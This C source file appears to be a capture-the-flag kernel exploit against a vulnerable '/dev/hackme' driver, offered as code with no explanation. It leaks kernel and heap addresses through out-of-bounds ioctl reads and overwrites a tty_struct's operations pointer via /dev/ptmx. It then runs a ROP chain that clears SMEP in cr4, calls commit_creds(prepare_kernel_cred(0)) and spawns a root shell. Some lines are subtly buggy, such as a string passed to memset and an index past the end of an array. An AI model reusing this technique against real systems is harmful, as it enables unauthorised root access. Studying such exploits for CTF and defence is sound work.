#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <signal.h>

size_t prepare_kernel = 0x4d160;
size_t commit_creds = 0x4d220;
size_t user_cs, user_ss, user_sp, user_rflags;
size_t swpgs_p_r12_r = 0xffffffff81200ed1-0xffffffff81000000;
size_t mv_cr4_rdx_p_r12_p_r15_r = 0xffffffff81033d77-0xffffffff81000000;
size_t p_rdx_r = 0xffffffff81030cd1-0xffffffff81000000;
size_t iretq_p_rbp_r = 0xffffffff81019356-0xffffffff81000000;
size_t p_rax_r = 0xffffffff8101b5a1 - 0xffffffff81000000;
size_t p_rbp_r = 0xffffffff8101b71c - 0xffffffff81000000;
size_t mv_rsp_rbp_p_rbp_r = 0xffffffff81033d4c - 0xffffffff81000000;
size_t mv_rsp_rax_r = 0xffffffff81200ef1 - 0xffffffff81000000;

size_t modprobe_path = 0x83f960;
int fd = 0;
typedef struct pool{
    size_t idx;
    char* buf;
    size_t size;
    size_t off;
}Kpool;

void err(char* buf){
    printf("%s Error\n", buf);
    exit(-1);
}

void getshell(){
    if(!getuid()){
        system("/bin/sh");
    }
    else{
        err("Not root");
    }
}

void getroot(){
    char* (*pkc)(int) = prepare_kernel;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}

void savestatus(){
       __asm__("mov user_cs,cs;"
           "mov user_ss,ss;"
           "mov user_sp,rsp;"
           "pushf;"            //push eflags
           "pop user_rflags;"
          );
}

void Add(size_t idx, size_t sz, char* buf){
    Kpool pl;
    pl.idx = idx;
    pl.buf = buf;
    pl.size = sz;
    if(-1 == ioctl(fd, 196608, &pl)){
        err("Add");
    }
}

void Delete(size_t idx){
    Kpool pl;
    pl.idx = idx;
    if(-1 == ioctl(fd, 196609, &pl)){
        err("Delete");
    }
}

void Input(size_t idx, size_t sz, char* buf, size_t off){
    Kpool pl;
    pl.idx = idx;
    pl.buf = buf;
    pl.size = sz;
    pl.off = off;
    if(-1 == ioctl(fd, 196610, &pl)){
        err("Input");
    }
}

void Output(size_t idx, size_t sz, char* buf, size_t off){
    Kpool pl;
    pl.idx = idx;
    pl.buf = buf;
    pl.size = sz;
    pl.off = off;
    if(-1 == ioctl(fd, 196611, &pl)){
        err("Output");
    }
}

int main(){
    savestatus();
    fd = open("/dev/hackme", 0);
    if(fd < 0){
        err("Open dev");
    }
    size_t ssize = 0x400;
    size_t size1 = 0x100;
    char bufA[0x400] = { 0 };
    char bufB[0x400] = { 0 };
    memset(bufA, 'A', 0x400);
    memset(bufB, 'B', 0x400);
    int chunkId = 0;
    puts("Add now");
    Add(chunkId++, ssize, bufB);
    Add(chunkId++, ssize, bufA);
    memset(bufA, 'B', 0x400);
    Add(chunkId++, ssize, bufA);
    memset(bufA, 'C', 0x400);
    Add(chunkId++, ssize, bufA);
    memset(bufA, 'D', 0x400);
    Add(chunkId++, ssize, bufA);  //4
    memset(bufA, '5', 0x400);
    Add(chunkId++, ssize, bufA);  //5

    puts("Leak addr:");
    char* buffer = malloc(0x1000);
    memset(buffer, "\x00", 0x1000);

    Output(0, 0x800+0x20, buffer, -0x800);
    size_t module_addr = 0x0;
    size_t vmlinux_addr = 0x0;
    module_addr = *(size_t*)(buffer+0x70)-0x1000;
    vmlinux_addr = *(size_t*)(buffer+0x40)-0x6de30;
    printf("module_addr: 0x%llx, vmlinux_addr: 0x%llx, mod:0x%llx\n", module_addr, vmlinux_addr,modprobe_path+vmlinux_addr);

    Delete(2);
    Delete(4);

    memset(buffer, "\x00", 0x1000);
    Output(5, 0x400, buffer, -0x400);
    size_t heap_addr = *(size_t*)buffer;
    printf("heap_addr: 0x%llx\n", heap_addr);

    int ptmx_fd = open("/dev/ptmx",0);
    if (ptmx_fd < 0){
        err("Not open ptmx");
    }
    printf("[+] ptmx fd : %d\n",ptmx_fd);

    memset(buffer, "\x00", 0x1000);
    Input(5, 0x400, buffer, -0x400);
    //print_hex(mem,0x400);
    if(*(size_t *)buffer != 0x0000000100005401){
        err("Not get ptmx");
    }

    prepare_kernel += vmlinux_addr;
    commit_creds += vmlinux_addr;

    char* tty_struct = malloc(0x400);
    size_t tty_opera[7] = { 0 };

    Output(5, 0x400+4*8, tty_struct, -0x400);
    int c = 0;
    size_t rop[0x200] = { 0 };
    rop[c++] = 0;
    rop[c++] = p_rdx_r+vmlinux_addr;
    rop[c++] = 0x6f0;
    rop[c++] = mv_cr4_rdx_p_r12_p_r15_r+vmlinux_addr;
    rop[c++] = 0;
    rop[c++] = 0;
    rop[c++] = (size_t)getroot;

    rop[c++] = swpgs_p_r12_r + vmlinux_addr;
    rop[c++] = 0;
    rop[c++] = iretq_p_rbp_r+vmlinux_addr;
    rop[c++] = 0;
    rop[c++] = (size_t)getshell;

    rop[c++] = user_cs;
    rop[c++] = user_rflags;
    rop[c++] = user_sp;
    rop[c++] = user_ss;

    tty_opera[0] = p_rbp_r + vmlinux_addr;
    tty_opera[1] = rop;
    tty_opera[2] = mv_rsp_rbp_p_rbp_r+vmlinux_addr;
    tty_opera[7] = mv_rsp_rax_r+vmlinux_addr;
    *(size_t*)(tty_struct+0x18) = tty_opera;

    Input(5, 0x400+4*8, tty_struct, -0x400);
    char bf[0x10] = { 0 };
    write(ptmx_fd, bf, 0x10);
    return 0;
}

